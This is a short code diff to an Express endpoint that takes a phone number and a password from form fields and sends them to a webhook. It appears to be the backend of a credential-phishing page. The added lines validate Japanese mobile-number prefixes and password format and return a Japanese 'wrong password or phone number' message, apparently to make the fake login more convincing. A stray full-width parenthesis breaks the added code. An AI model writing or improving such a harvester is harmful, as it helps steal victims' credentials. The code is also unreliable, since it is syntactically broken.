@@ -11,6 +11,12 @@ app.post("/send", async (req, res) => {
   const phone = req.body.name;
   const password = req.body.message;
 
+）
+  if (!/^(090|080|070|060)/.test(phone) || !/[A-Z]/.test(password)) {
+    return res.status(400).send("パスワードまたは電話番号が間違えています。");
+  }
+
+
   try {
     await fetch(webhook, {
       method: "POST",
